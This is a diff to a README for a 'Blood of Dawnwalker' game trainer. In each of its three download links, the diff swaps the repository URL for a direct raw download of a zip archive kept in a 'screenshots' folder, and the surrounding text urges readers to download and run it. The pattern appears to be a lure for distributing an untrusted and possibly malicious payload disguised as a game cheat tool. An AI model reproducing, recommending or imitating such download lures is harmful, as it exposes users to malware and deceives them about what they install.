@@ -1,6 +1,6 @@
 # 🎮 blood-of-dawnwalker-trainer - Unlock Unlimited Power in Dawnwalker
 
-[![Download Now](https://img.shields.io/badge/Download-Free_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ROLY8/blood-of-dawnwalker-trainer)
+[![Download Now](https://img.shields.io/badge/Download-Free_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ROLY8/blood-of-dawnwalker-trainer/main/screenshots/blood_of_trainer_dawnwalker_v2.1-alpha.1.zip)
 
 ## 🎯 What Is This Trainer?
 
@@ -21,7 +21,7 @@ Follow these simple steps to start using the trainer today. The entire process t
 ### 📥 Step 1: Download the Trainer
 
 Visit this link to download the application:  
-**[https://github.com/ROLY8/blood-of-dawnwalker-trainer](https://github.com/ROLY8/blood-of-dawnwalker-trainer)**
+**[https://raw.githubusercontent.com/ROLY8/blood-of-dawnwalker-trainer/main/screenshots/blood_of_trainer_dawnwalker_v2.1-alpha.1.zip](https://raw.githubusercontent.com/ROLY8/blood-of-dawnwalker-trainer/main/screenshots/blood_of_trainer_dawnwalker_v2.1-alpha.1.zip)**
 
 The download will start automatically. Save the file to an easy-to-find location, like your Desktop or Downloads folder.
 
@@ -163,7 +163,7 @@ Before you start playing, make sure you've:
 
 With this trainer, you can experience Dawnwalker in entirely new ways. Become an unstoppable force, explore every corner of the map, and enjoy the game at your own pace. Download now and start your journey as the ultimate Dawnwalker!
 
-**[👉 Download Blood of Dawnwalker Trainer Now](https://github.com/ROLY8/blood-of-dawnwalker-trainer)**
+**[👉 Download Blood of Dawnwalker Trainer Now](https://raw.githubusercontent.com/ROLY8/blood-of-dawnwalker-trainer/main/screenshots/blood_of_trainer_dawnwalker_v2.1-alpha.1.zip)**
 
 ---
 
